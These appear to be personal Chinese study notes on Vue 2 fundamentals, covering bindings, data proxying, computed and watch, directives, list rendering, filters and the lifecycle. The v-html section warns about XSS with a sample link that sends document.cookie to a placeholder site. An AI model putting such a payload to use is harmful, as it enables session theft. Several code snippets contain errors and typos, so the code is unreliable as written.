# Vue核心

## 1.1Vue简介

> VueApi
> 

[API 参考 | Vue.js](https://cn.vuejs.org/api/)

1、Vue是什么？一套用于***构建用户界面***的***渐进式***Js框架

***渐进式***：简单应用一个核心库解决、复杂应用引入插件

2、谁开发的？尤雨溪

3、特点

1. 采用***组件化***模式，提高代码复用率，更好维护代码
2. ***声明式***编码，无需直接操作DOM，提高开发效率
3. ***虚拟DOM*** + 优秀的***Diff算法*** 尽量复用DOM结点

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051744996.png" alt="vue实现" style="zoom: 67%;" />

vue实现

4、学习Vue之前还需要具备的前端技术栈

1. ES6语法规范
2. ES6模块化
3. 包管理器
4. 原型、原型链
5. 数组常用方法
6. axios
7. promise

### 总结

1. 想让Vue工作就要创建一个Vue实例，要传入一个配置对象{}
2. root容器里面的代码仍然符合html规范，只不过有Vue特殊的语法
3. root容器里面的代码被成为Vue模板
4. Vue和容器是一一对应的
5. 真实开发中只有一个实例，并且会配合着***组件***一起使用
6. {{xxx}}中xxx要写js表达式，且xxx可以自动读取到Vue实例的data对象中所有属性

```jsx
const x = new Vue({
    el: '#root', //el用于指定当前Vue实例为哪个div容器服务
    data: {// 用于存储数据，数据供el指定的容器使用
        name: 'Yovvis',
				url: 'https:www.baidu.com' //要用指令语法
    }
})
```

注意区分js表达式和js代码

1. 表达式有值
2. js代码是语句，是代码片段

## 1.2模板语法

1. 插值语法：
    1. 功能：用于解析***标签体***
    2. 写法：{{xxx}}，xxx是js表达式，且可以读取到data中的所有属性
2. 指令语法：
    1. 功能：用于解析***标签属性***（包括：标签属性，标签体内容，绑定事件）
    2. 举例：v-bind:href=’xxx’ 或者简写 :href=‘xxx’，这里的xxx也是js表达式，且可以获取到data里面所有属性
    3. 备注：Vue中很多指令都是v-???，这里v-bind是其中一个

## 1.3数据绑定

v-bind：

1. 单向绑定，数据有data流向页面

v-model：

1. 双向绑定（必须要交互的，只能应用在表单类元素）
2. v-model默认收集的是value值，因此***v-model:value = v-model***

## 1.4el与data的写法

***el***

1. el: “#root”
2. const v = new Vue({   })  == > v.***$mount***(”#root”)         $mount在set name下面

***data***

1. 对象式  data：+json
2. 函数式  data:   function(){} this返回的是***Vue实例***  不能用data:()— >{} 箭头函数找不到this，this是***BOM对象***     

## 1.5MVVM模型

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051743266.png" alt="MVVM模型" style="zoom:50%;" />

MVVM模型

观察发现：

1. data中所有的属性，最后都出现在vm身上
2. vm身上所有的属性及Vue原型上所有属性，在Vue模板中都是可以直接使用

## 1.6数据代理

### defineProperty函数

```jsx
let number = 18
let person = {
	name: '张三',
	sex: '男'
}

Object.defineProperty(person,'age',{
	value: 18，
	ennumberable: true, // 控制属性是否可以被枚举，默认值是false
	writable: true,     // 控制属性是否可以被修改，默认值是false
	configurable: true  // 控制属性是否可以被删除，默认值是false

	// 当有人读取person的age属性时，get函数（getter）就会被调用，返回就是age值
	get(){
		console.log("有人读取age属性了");
		return number
	},

	// 当有人修改person的age属性时，set函数（setter）就会被调用，且会收到修改值
	set(value){
		console.log('有人读取age属性了');
		number = value
	}

})
```

### 数据代理：

通过一个对象代理对另一个对象中属性的操作（读 / 写）

```jsx
let obj1 = {x:100}（data）
let obj2 = {y:200}（vm）
Object.defineProperty(obj2,'x',{
	// 当有人读取person的age属性时，get函数（getter）就会被调用，返回就是age值
	get(){
		console.log("有人读取age属性了");
		return obj1.x
	},

	// 当有人修改person的age属性时，set函数（setter）就会被调用，且会收到修改值
	set(value){
		console.log('有人读取age属性了');
		obj1.x = value
	}

})
```

### vue数据代理

上面的obj2就是vm，obj1就是data，***vm会给vm原型链自己加上***_data***的属性***

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306051743443.png" alt="Untitled" style="zoom:50%;" />

这里vm._data === [options.data](http://options.data) === data

_data里面做了***数据劫持***

1. Vue中的数据代理：
   
    通过vm对象来代理data对象中属性的操作
    
2. Vue中数据代理的好处：
   
    更方便的操作data中的数据
    
3. 基本原理：
   
    通过Object.defineProperty()把data对象中所有属性添加到vm上，且指定一个getter和setter，用getter和setter操作data中的属性
    

## 1.7事件处理

```jsx
<button v-on:click="showInfo">欢迎来到yovvis(不传参)</button>
<button v-on:click="showInfo(66,***$event***)">欢迎来到yovvis（传参）</button>
const x = new Vue({
    el: '#root', //el用于指定当前Vue实例为哪个div容器服务
    data: {// 用于存储数据，数据供el指定的容器使用
        name: 'Yovvis',
            url: 'https:www.baidu.com' //要用指令语法
    },
		method: {
            showInfo(event){
                    // event就是<button></button>
                    console.log(this);// this就是vm
                    alert(event);
            },
            showInfo2(num,event){
                // event就是<button></button>
                console.log(this);// this就是vm
                alert(event);
            }
		}
})
```

事件基本使用：

1. 使用v-on:xxx或@xxx绑定事件,其中xxx是事件名
2. 事件的回调需要配置在methods对象中，最终会在vm上;
3. methods中配置的函数，不要用箭头函数!否则this就不是vm了;
4. 4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm或组件实例对象;
5. @click="demo”和@click=""demo($event)”效果一致，但后者可以传参;

### 事件修饰符

~~~js
@click.xxx=""
~~~

vue中的事件修饰符:

1. prevent:阻止默认事件（常用）;
2. stop:阻止事件冒泡（常用）
3. once:事件只触发一次（常用);
4. capture:使用事件的捕获模式;
5. self:只有event.target是当前操作的元素是才触发事件;
6. passive:事件的默认行为立即执行，无需等待事件回调执行完毕;

div（外）——>div（内）***捕获*** ——内——>外冒泡

@wheel可以一直滚；@scroll不可以

他们的逻辑是   滚动——执行事件——条下移，但是加上passive就立刻滚动了

***修饰符可以连续写***

### 键盘事件

@keyup.enter=”method”

特殊的@keyup.caps-lock=”method”（分割）

1. Vue中常用别名
   
    回车 enter
    
    删除 delete
    
    退出 esc
    
    空格 space
    
    换行 tab （keydown）
    
    上下左右 up down left right
    
2. Vue未提供别名的按键，可以使用按健原始的key值去绑定，但注意要转为kebab-case(短横线命名)
3. 系统修饰键（用法特殊）:ctr1、alt、shift、meta
   (1).配合keyup使用:按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
   
    (2).配合keydown使用:正常触发事件。
   
4. 也可以使用keyCode去指定具体的按键（不推荐)
5. Vue.config.keyCodes.自定义健名=键码,可以去定制按键别名

***键盘可以连写***

## 1.8计算属性

在Vue中data里面是属性，通过data里面属性操作后生成的属性

```jsx
computed:{
	fullName: {
		// 初次读取fullName时候，所依赖的数据变化时会加载，不然就读取缓存里的值
		get(){
			return this.firstName + "-" + this.lastName;
		},
		set(value){
			this.firstName = value.split("-")[0];
			this.lastName = value.split("-")[1];
		}
	}
}
```

_data中是不会有计算属性的

这里是拿到getter的返回值放到vm身上

1. 定义：要用的属性不存在，要通过已有的属性计算得来
2. 原理：底层还是借助[Object.defineproperty]方法提供的getter和setter
3. getter函数什么时候执行
    1. 初次读取会执行，并放入缓存
    2. 依赖的数据发生改变时会再次调用
4. 优势：与method机制，内部有缓存机制，效率更高，调试方便
5. 备注：
    1. 计算属性最后会挂载在vm上，直接读取调用
    2. 如果计算属性要被修改，必须改setter，且要在setter修改依赖的属性

***简写***

只考虑读取不考虑修改

```jsx
computed:{
	fullName: function(){
        return this.firstName + "-" + this.lastName;
	}
}
computed:{
	fullName(){
        return this.firstName + "-" + this.lastName;
	}
}

```

***注意：***@click=“isHot ? ‘炎热’：’凉爽’”，事件中可以直接写返回语句，但是一定是定义在data里面的属性

## 1.9监视属性

两个方法，在创建实例的时候想监视的时候用**<u>*法一*</u>**

~~~js
watch: {
    isHot:{
        immediate:true,// 初始化的时候让handler调用一下（也就是isHot发生改变的时候）
    	handler(newValue,oldValue){
            console.log('isHot被修改了',newValue,oldValue)
        }
    }
}
~~~

或者

~~~js
vm.$watch('isHot',{
 	immediate:true,// 初始化的时候让handler调用一下（也就是isHot发生改变的时候）
    handler(newValue,oldValue){
        console.log('isHot被修改了',newValue,oldValue)
    }
})
~~~

### 总结

监视属性watch:

1. 当被监视的属性变化时，回调函数自动调用，进行相关操作
2. 监视的属性必须存在，才能进行监视!!
3. 监视的两种写法:
	1. new Vue时传入watch配置
	2. 通过vm.$watch监视

### 深度监视

~~~js
data:{
    numbers:{
        a:1,
        b:1
    }
}
watch:{
    numbers:{
        //'numbers.a':{},
        deep:true,
        handle(){
            console.log('isHot被修改了',newValue,oldValue)
        }
	}
}
~~~

#### 总结

1. vue中的watch默认不监测对象内部值的改变(一层）
2. 配置deep:true可以监测对象内部值改变（多层）

#### 备注

1. Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以!
2. 使用watch时根据数据的具体结构，决定是否采用深度监视。

### 监视简写

简写形式的前提：1、不需要immediate2、不需要深度监视

~~~js
watch:{
    isHot(newValue,oldValue){
     	console.log('isHot被修改了',newValue,oldValue)
    }
}
~~~

~~~js
vm.$watch('isHot',function(newValue , oldValue){
    console.log('isHot被修改了',newValue,oldValue)
})
~~~

### 监视和计算属性

computed和lwatch之间的区别:

1. computed能完成的功能,watch都可以完成。
2. watch能完成的功能，computed不一定能完成，例如: watch可以进行异步操作。

两个重要的小原则:

1. 所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm或组件实例对象。
2. 所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数,Promise的回调函数等)，最好写成箭头函数，这样this的指向才是vm或组件实例对象。

## 1.10绑定CSS样式

- .basic
- .happy .sad .normal
- yovvis1
- yovvis2
- yovvis3

1. 用v-bind或者：控制class
2. js生成随机数Math.floor(Math.random()*3)向下取整
3. arr.push()和arr.shift()

### 总结

绑定样式:

1. class样式

	写法:class="xxx" xxx可以是字符串、对象、数组。

	字符串写法适用于:类名不确定，要动态获取。

	对象写法适用于:要绑定多个样式，个数不确定，名字也不确定。

	数组写法适用于:要绑定多个样式，个数确定，名字也确定，但不确定用不用。

2. style样式

	: style="{fontsize: xxx]"其中xxx是动态值。

	: style="[a,b]"其中a、b是样式对象。

## 1.11条件渲染

~~~js
<div v-if="n==1">aaa</div>
~~~

条件渲染:

1. v-if

	写法：

	​	(1).v-if="表达式"

	​	(2).v-else-if="表达式"

	​	(3).v-else="表达式"

	适用于:切换频率较低的场景。

	特点:不展示的DOM元素直接被移除。

	注意:v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”

2. v-show

	写法: v-show="表达式"

	适用于:切换频率较高的场景。

	特点:不展示的DOM元素未被移除，仅仅是使用样式隐藏掉

3. 备注:使用v-if的时，元素可能无法获取到，而使用v-show一定可以获取到。

**<u>*ps:*</u>**template只能和v-if使用

## 1.12列表渲染

### 基本列表

这里是用遍历数组举例

~~~js
<ul>
	<li v-for="p in persons" :key='p.id'>
    	{{p.name}}-{{p.age}}    
    </li>    
</ul>

<ul>
	<li v-for="(p,index) in/of persons" :key='index'>
    	{{p.name}}-{{p.age}}    
    </li>    
</ul>
new Vue({
    data:{
        persons:[
            {id:'1',name:'1',age:15},{id:'2',name:'1',age:16},{id:'3',name:'1',age:17}
        ]
    }
})
~~~

react一定要有v-for要有key

1. 用于展示列表数据
2. 语法:v-for="(item,index) in xxx" :key="yyy"
3. 可遍历:数组、对象、字符串（用的很少)、指定次数（用的很少)

### key原理

用index破环顺序的操作

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306081316524.png" alt="image-20230608131628360" style="zoom: 50%;" />

用唯一标识不会出问题

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306081318200.png" alt="image-20230608131846052" style="zoom: 50%;" />

#### 面试题

面试题: react、 vue中的key有什么作用?(key的内部原理)？

1. 虚拟DOM中key的作用:

	key是虚拟DOM对象的标识，当数据发生变化时，Vue会根据【新数据】生成【新的虚拟DON】,

	随后Vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下:

2. 对比规则:

	1. 旧虚拟DOM中找到了与新虚拟DOM相同的key:

		- 若虚拟DOM中内容没变,直接使用之前的真实DOM !

		- 若虚拟bow中内容变了，则生成新的真实DOM，随后替换掉页面中之前的真实DOM.

	2. 旧虚拟DOM中未找到与新虚拟DOM相同的key

		- 创建新的真实DOM，随后渲染到到页面。

3. 用index作为key可能会引发的问题:

	1. 若对数据进行:逆序添加、逆序删除等破坏顺序操作:

		会产生没有必要的真实DOM更新==〉界面效果没问题,但效率低。

	2. 如果结构中还包含输入类的DOM:

		会产生错误DOM更新==>界面有问题。

4. 开发中如何选择key?:

	1. 最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一值。
	2. 如果不存在对数据的逆序添加、逆序删除等破坏顺序操作，仅用于渲染列表用于展示,使用index作为key是没有问题的。

### 列表过滤

排序（改变原数据）+过滤（生成新数据）

~~~js
new Vue({
    data:{
        keyword:"",
        sortType: 0, //0是原顺序 1降序 a-b 1升序b-a
        persons:[
            {id:'1',name:'张三',age:35},{id:'2',name:'李四',age:21},{id:'3',name:'王五',age:17}
        ]
    }，
    computed:{
    	filPersons:{
    	  const arr = this.persons.filter((p)=>{
    			return p.name.indexof(this.keywords)! ==-1
			})
         return arr
		}
	}
})
~~~

### 列表排序

~~~js
new Vue({
    data:{
        keyword:"",
        sortType: 0, //0是原顺序 1降序 b-a 1升序a-b
        persons:[
            {id:'1',name:'张三',age:35},{id:'2',name:'李四',age:21},{id:'3',name:'王五',age:17}
        ]
    }，
    computed:{
    	filPersons:{
    	  const arr = this.persons.filter((p)=>{
    			return p.name.indexof(this.keywords)! ==-1
			})
         // 判断是否需要排序
          if(this.sortType){
              arr.sort((p1,p2)=>{
                  return this.sortType === 1 ? p2.age-p1.age : p1.age-p2.age
              })
          }
		  return arr
		}
	}
}) 
~~~

### 更新问题

~~~js
// 上述的persons
methods:{
    update(){
       // this.persons[0].name = "12121" //奏效
        persons[0] = {id:'1',name:'张三',age:14} // 不行
    }
}
~~~

### 监测数据的原理-对象

本质就是从**<u>*data加工*</u>**==> **<u>*vm._data=data*</u>**

~~~js
let data = {
    name: 'yovvis',
    address: '苏州'
}
Object.defineProperty(data, 'name', {
    get() {
        return data.name;
    },
    set(val) {
        data.name = val;
    }
})
~~~

上述代码会陷入死循环

### 自定义监视器

~~~js
let data = {
    name: 'yovvis',
    address: '苏州'
}

// 创建一个监视实例的对象，用于监视data中属性的变化
const obs = new Observer(data);

// 准备vm实例对象
let vm = {}
vm._data = data = obs;

function Observer(obj) {
    // 汇总对象中所有属性为 数组
    const keys = Object.keys(obj);
    // 遍历
    keys.forEach((k) => {
        // 这里的this是observer
        Object.defineProperty(this, k, {
            get() {
                return obj[k];
            },
            set(val) {
                console.log("name值被改了，解析中，生成虚拟dom》》》");
                obj[k] = val;
            }
        })
    })
}
~~~

### Vue.set使用

Vue.set(vm.student,'sex','男')或者vm.$set(vm.student,'sex','男')

此处set不能直接作用**<u>*data*</u>**下的属性或者是**<u>*响应式对象*</u>**

### 监测数据的原理-数组

上文**<u>*更新问题*</u>**其实如下

vm._data.student.hobby[0] = '学习'

- 实际上确实改了，但是Vue不认可，原因是数组里面的数据没有getter和setter

- 一个数组操作 push(后加) pop(删尾)shift(删首) unshift(前加) splice(替换某个位置指定元素) sort(排序) reverse(反转) 

- 通过**<u>*包装*</u>**检测，不是调用的Array.prototype.push
- vue中的push做了两件事，先调原型Array。。。,然后重写解析模板，生成虚拟dom

~~~js
Vue.set(vm.student,index,'打台球')// 修改可以用set
~~~

### 大总结

Vue监视数据的原理:

1. vue会监视data中所有层次的数据。

2. 如何监测对象中的数据?

   通过setter实现监视，且要在new Vue时就传入要监测的数据。

   (1).对象中后追加的属性，Vue默认不做响应式处理

   (2).如需给后添加的属性做响应式，请使用如下API:

   ​	Vue.set(target.propertyName/index，value)或

   ​	vm.$set(target.propertyName/index，value)

3. 如何监测数组中的数据?

   通过包裹数组更新元素的方法实现,本质就是做了两件事:

   (1)．调用原生对应的方法对数组进行更新。

   (2).重新解析模板,进而更新页面。

4. 在Vue修改数组中的某个元素一定要用如下方法:

   1. 使用这些API:push()、pop()、shift()、unshift()、splice()、sort()、reverse()
   2. Vue.set()或vm.$set()

特别注意: Vue.set()和vm.$set()不能给vm 或 vm的根数据对象添加属性!!

## 1.13收集表单数据

收集表单数据:

​	若:<input type="text"/>，则v-model收集的是value值，用户输入的就是value值

​	若:<input type="radio"/>，则v-model收集的是value值，且要给标签配置value值。

​	若:<inpuf type="checkbox" />

​		1.没有配置input的value属性，那么收集的就是checked（勾选 or未勾选，是布尔值)

​		2.配置input的value属性:

​			(1)v-model的初始值是非数组，那么收集的就是checked（勾选or未勾选，是布尔值）

​			(2)v-model的初始值是数组，那么收集的的就是value组成的数组

​	备注:v-model的三个修饰符:

​		lazy:失去焦点再收集数据

​		number:输入字符串转为有效的数字

​		trim:输入首尾空格过滤

## 1.14过滤器

~~~js
// 全局过滤器
Vue.filter('myfilter',function(value){
   return value.slice(0,4);
})

// 局部过滤器
<h1>{{msg | myfiler | myfilter2 }}</h1>

filters:{
    myfilter(value){
        return value.slice(0,4);
    }
}
~~~

过滤器:
定义:对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑的处理）。

语法:

1. 注册过滤器: Vue.filter(name,callback)或new Vue{filters:{]
2. 使用过滤器:{{ xxx│过滤器名}}或v-bind:属性= “xxx│过滤器名"

备注:

1. 过滤器也可以接收额外参数、多个过滤器也可以串联
2. 并没有改变原本的数据,是产生新的对应的数据

## 1.15内置指令

我们学过的指令:

v-bind:单向绑定解析表达式，可简写为:xXX

v-model :双向数据绑定

v-for:遍历数组/对象/字符串

v-on:绑定事件监听,可简写为@

v-if:条件渲染（动态控制节点是否存存在)

v-else:条件渲染（动态控制节点是否存存在)

v-show:条件渲染（动态控制节点是否展示)

### v-text

1. 作用:向其所在的节点中渲染文本内容。
2. 与插值语法的区别: v-text会替换掉节点中的内容，{ixx}}则不会。

### v-html

要考虑到安全性问题

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306101839442.png" alt="image-20230610183854816" style="zoom:50%;" />

v-html指令:

1. 作用:向指定节点中渲染包含html结构的内容。

2. 与插值语法的区别:

   (1).v-html会替换掉节点中所有的内容,{{xx}}则不会。

   (2).v-html可以识别html结构。

3. 严重注意: v-html有安全性问题!!!!

​	(1).在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

​	(2).一定要在可信的内容上使用v-html，永不要用在用户提交的内容上!

~~~js
<div v-html="str"></div>
new Vue(){
    el:"#root",
    data:{
        str:'<a href=javascript:location.href="xxxx网站?"+document.cookie >兄弟我找到很好玩的东西'
    }
}
~~~

### v-cloak

v-cloak指令(没有值):

1. 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
2. 使用css配合v-cloak可以解决网速慢时页面展示出{{xXx}}的问题。

### v-once

v-once指令:

1. v-once所在节点在初次动态渲染后，就视为静态内容了。
2. 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。

### v-pre

v-pre指令:

1. 跳过其预在节点的编详过霜.
2. 可利用它跳过:没有使用指令语法、没有使用插值语法的节点。公加快编译。

## 1.16自定义指令

~~~js
directives:{
    big(element,binding){
        element.innerText = binding.value
    }
}
~~~

### 总结

一、定义语法:

(1).局部指令:

~~~js
new Vue({
    directives:{嘴令名:配置对象}
})
new Vue({
    directives(){0}
})
~~~

(2).全局指令:

Vue.directive(指令名,配置对象）或Vue.directive(指令名凹调函双)

二、配置对象中常用的3个回调:

​	(1).bind:指令与元素成功绑定时调用。

​	(2).inserted:指令所在元素被插入页面时调用。

​	(3).update:指令所在模板结构被重新解析时调用。

三、备注:

1. 指令定义时不加v-，但使用时要加v-;
2. 指令名如果是多个单词，要使用kebab-case命名方式，不要用camelCase命名。
3. **<u>*这里的this都是win*</u>**

## 1.17生命周期

### 引出生命周期

1. 又名:生命周期回调函数、生命周期函数、生命周期钩了。
2. 是什么:Vue在关键时刻帮我们调用的一些特殊名称的函数。
3. 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的。
4. 生命周期函数中的this指向是vm或组件实例对象。

### 分析生命周期

<img src="https://tyangjian.oss-cn-shanghai.aliyuncs.com/tmp/202306111359930.png" alt="image-20230611135908709" style="zoom: 80%;" />
